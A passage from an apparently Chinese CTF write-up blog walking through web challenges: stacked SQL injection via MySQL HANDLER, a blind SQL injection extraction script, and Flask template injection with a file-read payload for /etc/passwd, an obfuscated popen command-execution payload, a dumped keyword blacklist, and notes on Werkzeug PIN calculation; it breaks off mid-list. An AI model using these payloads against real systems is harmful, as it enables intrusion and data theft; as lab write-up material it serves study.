[3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]&#x3D;&gt;</span><br><span class=\"line\">  string(4) &quot;flag&quot;</span><br><span class=\"line\">  [1]&#x3D;&gt;</span><br><span class=\"line\">  string(12) &quot;varchar(100)&quot;</span><br><span class=\"line\">  [2]&#x3D;&gt;</span><br><span class=\"line\">  string(2) &quot;NO&quot;</span><br><span class=\"line\">  [3]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">  [4]&#x3D;&gt;</span><br><span class=\"line\">  NULL</span><br><span class=\"line\">  [5]&#x3D;&gt;</span><br><span class=\"line\">  string(0) &quot;&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>flag 在FlagHere表中的flag列，经过测试语句应该是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;select data from words where id&#x3D;$_GET[id]&#39;</span><br></pre></td></tr></table></figure>\n\n<p>需要跨表查询，由于select被过滤，但是mysql还有一个handler可以使用（打比赛的时候没有找到，太可惜了）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：1&#39;; handler FlagHere open; handler FlagHere read first; handler FlagHere close;#</span><br></pre></td></tr></table></figure>\n\n<p>如果表名是数字需要使用反撇号包裹。</p>\n<h1 id=\"Ezsqli\"><a href=\"#Ezsqli\" class=\"headerlink\" title=\"Ezsqli\"></a>Ezsqli</h1><p> 是一个提交窗口，经过测试过滤了如下字符0</p>\n<p><img src=\"/pic/111.png\" alt=\"\"></p>\n<p>后面又测试了一次，发现单独的or没有被过滤，*or就被过滤了</p>\n<p><img src=\"/pic/112.png\" alt=\"\"></p>\n<p>information_schema.tables可以使用<code>sys.schema_table_statistics_with_buffer</code>或<code>sys.schema_table_statistics_with_buffer</code>代替。</p>\n<p>数据使用无列名注入</p>\n<p>首先盲注获取数据库名</p>\n<p>附上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># @Time    : 2/24/2020 11:21 AM</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">str2hex</span><span class=\"params\">(strs)</span>:</span></span><br><span class=\"line\">    hexs=<span class=\"string\">'0x'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(len(strs)):</span><br><span class=\"line\">        hexs+=hex(ord(strs[x]))[<span class=\"number\">2</span>:]</span><br><span class=\"line\">    <span class=\"comment\"># print(hexs)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">    url=<span class=\"string\">'http://0445a30e864f4cd8a6e4a54b3043663dd97491883a5749df.changame.ichunqiu.com/'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(url)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"string\">'id'</span>:<span class=\"string\">'0^('</span>+payload+<span class=\"string\">')'</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    html = requests.post(url,data=data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea</span><span class=\"params\">(s_payload,len=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= len :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        left = <span class=\"number\">0</span></span><br><span class=\"line\">        right = <span class=\"number\">126</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> left &lt;= right:</span><br><span class=\"line\">            mid = (left + right) / <span class=\"number\">2</span></span><br><span class=\"line\">            payload = <span class=\"string\">\"ascii(substr((%s),%d,1))&gt;%d\"</span> % (s_payload,x, mid)</span><br><span class=\"line\">            <span class=\"comment\"># t1=time.time()</span></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html,'*-*-*-*-*-*', mid,'    ',payload)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'Nu1L'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                left = mid +<span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                right = mid <span class=\"number\">-1</span></span><br><span class=\"line\">        mid = int((left + right + <span class=\"number\">1</span>) / <span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mid == <span class=\"number\">0</span> :</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> :</span><br><span class=\"line\">            result += chr(mid)</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        x=x+<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_database</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'database()'</span></span><br><span class=\"line\">    database = binsea(s_payload)</span><br><span class=\"line\">    <span class=\"comment\"># print(database)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tables</span><span class=\"params\">(db)</span>:</span></span><br><span class=\"line\">    db=str2hex(db)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema='</span>+db+<span class=\"string\">')'</span></span><br><span class=\"line\">    tables=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_columns</span><span class=\"params\">(table)</span>:</span></span><br><span class=\"line\">    table = str2hex(table)</span><br><span class=\"line\">    s_payload = <span class=\"string\">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    columns=binsea(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(columns,table)</span>:</span></span><br><span class=\"line\">    s_payload=<span class=\"string\">'select(group_concat('</span>+columns+<span class=\"string\">'))from('</span>+table+<span class=\"string\">')'</span></span><br><span class=\"line\">    password=binsea2(s_payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binsea2</span><span class=\"params\">(length=<span class=\"number\">999</span>)</span>:</span></span><br><span class=\"line\">    result = <span class=\"string\">''</span></span><br><span class=\"line\">    x=<span class=\"number\">1</span></span><br><span class=\"line\">    dic=<span class=\"string\">'-'</span>+<span class=\"string\">'0123456789'</span>+string.ascii_lowercase+<span class=\"string\">'&#123;&#125;~'</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> x &lt;= length :</span><br><span class=\"line\">        error = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> each <span class=\"keyword\">in</span> range(len(dic)):</span><br><span class=\"line\">            payload = <span class=\"string\">\"select (select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh)\"</span>.format(str2hex(result+dic[each]))</span><br><span class=\"line\">            print(result+dic[each])</span><br><span class=\"line\">            <span class=\"comment\"># t1=time.time()</span></span><br><span class=\"line\">            res = get(payload)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> res.status_code == <span class=\"number\">404</span> <span class=\"keyword\">or</span> res.status_code == <span class=\"number\">429</span>:</span><br><span class=\"line\">                x=x<span class=\"number\">-1</span></span><br><span class=\"line\">                error = <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            html=res.text</span><br><span class=\"line\">            <span class=\"comment\"># print(html[0:-6])</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> error == <span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"string\">'Nu1L'</span> <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                result +=dic[each<span class=\"number\">-1</span>]</span><br><span class=\"line\">                print(result)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        x = x + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_database() #ctf</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get_tables('ctf')#users233333333333333,f1ag_1s_h3r3_hhhhh</span></span><br><span class=\"line\"></span><br><span class=\"line\">binsea2()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"Flaskapp\"><a href=\"#Flaskapp\" class=\"headerlink\" title=\"Flaskapp\"></a>Flaskapp</h1><p>打开题目</p>\n<p>在解密中随意输入几个，让其报错，爆出部分代码，发现是一个flask框架写的base64的加解密小工具运行在PYTHON3.7。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.values.get(<span class=\"string\">'text'</span>) :</span><br><span class=\"line\">        text = request.values.get(<span class=\"string\">\"text\"</span>)</span><br><span class=\"line\">        text_decode = base64.b64decode(text.encode())</span><br><span class=\"line\">        tmp = <span class=\"string\">\"结果 ： &#123;0&#125;\"</span>.format(text_decode.decode())</span><br><span class=\"line\">        <span class=\"keyword\">if</span> waf(tmp) :</span><br><span class=\"line\">            flash(<span class=\"string\">\"no no no !!\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\">        res =  render_template_string(tmp)</span><br><span class=\"line\">        flash( res )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">         text = <span class=\"string\">\"\"</span></span><br></pre></td></tr></table></figure>\n\n<p>是模板注入，然后还有一个过滤，还能打开python交互界面但是有密码</p>\n<p><img src=\"/pic/114.png\" alt=\"\"></p>\n<p>任意文件读取</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br><span class=\"line\">base64后</span><br><span class=\"line\">e3soKS5fX2NsYXNzX18uX19iYXNlc19fWzBdLl9fc3ViY2xhc3Nlc19fKClbNzVdLl9faW5pdF9fLl9fZ2xvYmFsc19fLl9fYnVpbHRpbnNfX1snb3BlbiddKCcvZXRjL3Bhc3N3ZCcpLnJlYWQoKX19</span><br></pre></td></tr></table></figure>\n\n<p>结果为</p>\n<p><img src=\"/pic/115.png\" alt=\"\"></p>\n<p>提取/app/app.py所有代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask,render_template_string</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> render_template,request,flash,redirect,url_for</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_wtf <span class=\"keyword\">import</span> FlaskForm</span><br><span class=\"line\"><span class=\"keyword\">from</span> wtforms <span class=\"keyword\">import</span> StringField, SubmitField</span><br><span class=\"line\"><span class=\"keyword\">from</span> wtforms.validators <span class=\"keyword\">import</span> DataRequired</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_bootstrap <span class=\"keyword\">import</span> Bootstrap</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">'SECRET_KEY'</span>] = <span class=\"string\">'s_e_c_r_e_t_k_e_y'</span></span><br><span class=\"line\">bootstrap = Bootstrap(app)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NameForm</span><span class=\"params\">(FlaskForm)</span>:</span></span><br><span class=\"line\">    text = StringField(<span class=\"string\">'BASE64加密'</span>,validators= [DataRequired()])</span><br><span class=\"line\">    submit = SubmitField(<span class=\"string\">'提交'</span>)</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NameForm1</span><span class=\"params\">(FlaskForm)</span>:</span></span><br><span class=\"line\">    text = StringField(<span class=\"string\">'BASE64解密'</span>,validators= [DataRequired()])</span><br><span class=\"line\">    submit = SubmitField(<span class=\"string\">'提交'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(str)</span>:</span></span><br><span class=\"line\">    black_list = [<span class=\"string\">\"flag\"</span>,<span class=\"string\">\"os\"</span>,<span class=\"string\">\"system\"</span>,<span class=\"string\">\"popen\"</span>,<span class=\"string\">\"import\"</span>,<span class=\"string\">\"eval\"</span>,<span class=\"string\">\"chr\"</span>,<span class=\"string\">\"request\"</span>,</span><br><span class=\"line\">                  <span class=\"string\">\"subprocess\"</span>,<span class=\"string\">\"commands\"</span>,<span class=\"string\">\"socket\"</span>,<span class=\"string\">\"hex\"</span>,<span class=\"string\">\"base64\"</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"?\"</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> black_list :</span><br><span class=\"line\">        <span class=\"keyword\">if</span> x <span class=\"keyword\">in</span> str.lower() :</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/hint',methods=['GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hint</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    txt = <span class=\"string\">\"失败乃成功之母！！\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"hint.html\"</span>,txt = txt)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/',methods=['POST','GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encode</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.values.get(<span class=\"string\">'text'</span>) :</span><br><span class=\"line\">        text = request.values.get(<span class=\"string\">\"text\"</span>)</span><br><span class=\"line\">        text_decode = base64.b64encode(text.encode())</span><br><span class=\"line\">        tmp = <span class=\"string\">\"结果  :&#123;0&#125;\"</span>.format(str(text_decode.decode()))</span><br><span class=\"line\">        res =  render_template_string(tmp)</span><br><span class=\"line\">        flash(tmp)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'encode'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        text = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        form = NameForm(text)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"index.html\"</span>,form = form ,method = <span class=\"string\">\"加密\"</span> ,img = <span class=\"string\">\"flask.png\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decode</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.values.get(<span class=\"string\">'text'</span>) :</span><br><span class=\"line\">        text = request.values.get(<span class=\"string\">\"text\"</span>)</span><br><span class=\"line\">        text_decode = base64.b64decode(text.encode())</span><br><span class=\"line\">        tmp = <span class=\"string\">\"结果 ： &#123;0&#125;\"</span>.format(text_decode.decode())</span><br><span class=\"line\">        <span class=\"keyword\">if</span> waf(tmp) :</span><br><span class=\"line\">            flash(<span class=\"string\">\"no no no !!\"</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\">        res =  render_template_string(tmp)</span><br><span class=\"line\">        flash( res )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> redirect(url_for(<span class=\"string\">'decode'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span> :</span><br><span class=\"line\">        text = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        form = NameForm1(text)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"index.html\"</span>,form = form, method = <span class=\"string\">\"解密\"</span> , img = <span class=\"string\">\"flask1.png\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/&lt;name&gt;',methods=['GET'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">not_found</span><span class=\"params\">(name)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">\"404.html\"</span>,name = name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, port=<span class=\"number\">5000</span>, debug=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>可以看见黑名单</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"string\">\"flag\"</span>,<span class=\"string\">\"os\"</span>,<span class=\"string\">\"system\"</span>,<span class=\"string\">\"popen\"</span>,<span class=\"string\">\"import\"</span>,<span class=\"string\">\"eval\"</span>,<span class=\"string\">\"chr\"</span>,<span class=\"string\">\"request\"</span>,</span><br><span class=\"line\">                  <span class=\"string\">\"subprocess\"</span>,<span class=\"string\">\"commands\"</span>,<span class=\"string\">\"socket\"</span>,<span class=\"string\">\"hex\"</span>,<span class=\"string\">\"base64\"</span>,<span class=\"string\">\"*\"</span>,<span class=\"string\">\"?\"</span>]</span><br></pre></td></tr></table></figure>\n\n\n\n<p>直接上Vulhub的payload修改一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class=\"line\">&#123;% <span class=\"keyword\">if</span> c.__name__ == <span class=\"string\">'catch_warnings'</span> %&#125;</span><br><span class=\"line\">  &#123;% <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class=\"line\">  &#123;% <span class=\"keyword\">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class=\"line\">    &#123;% <span class=\"keyword\">if</span> <span class=\"string\">'ev'</span>+<span class=\"string\">'al'</span> <span class=\"keyword\">in</span> b.keys() %&#125;</span><br><span class=\"line\">      &#123;&#123; b[<span class=\"string\">'eva'</span>+<span class=\"string\">'l'</span>](<span class=\"string\">'__imp'</span>+<span class=\"string\">'ort__(\"o\"+\"s\").pop'</span>+<span class=\"string\">'en(\"id\").read()'</span>) &#125;&#125;</span><br><span class=\"line\">    &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endif %&#125;</span><br><span class=\"line\">  &#123;% endfor %&#125;</span><br><span class=\"line\">&#123;% endif %&#125;</span><br><span class=\"line\">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看目录  ls</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">app bin boot dev etc home lib lib64 media mnt opt proc requirements.txt root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br></pre></td></tr></table></figure>\n\n<p>查看flag   cat this_is_the_fl”+”ag.txt</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure>\n\n<p>想通过计算PIN，但是获取所有信息后计算出来不一致。</p>\n<h3 id=\"另一种解法\"><a href=\"#另一种解法\" class=\"headerlink\" title=\"另一种解法\"></a>另一种解法</h3><p>计算PIN <a href=\"https://xz.aliyun.com/t/2553\" target=\"_blank\" rel=\"noopener\">参考链接</a></p>\n<p>需要获取六个变量的值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username <span class=\"comment\"># 用户名</span></span><br><span class=\"line\"></span><br><span class=\"line\">modname <span class=\"comment\"># flask.app</span></span><br><span class=\"line\"></span><br><span class=\"line\">getattr(app, <span class=\"string\">'__name__'</span>, getattr(app.__class__, <span class=\"string\">'__name__'</span>)) <span class=\"comment\"># Flask</span></span><br><span class=\"line\"></span><br><span class=\"line\">getattr(mod, <span class=\"string\">'__file__'</span>, <span class=\"literal\">None</span>) <span class=\"comment\"># flask目录下的一个app.py的绝对路径</span></span><br><span class=\"line\"></span><br><span class=\"line\">uuid.getnode() <span class=\"comment\"># 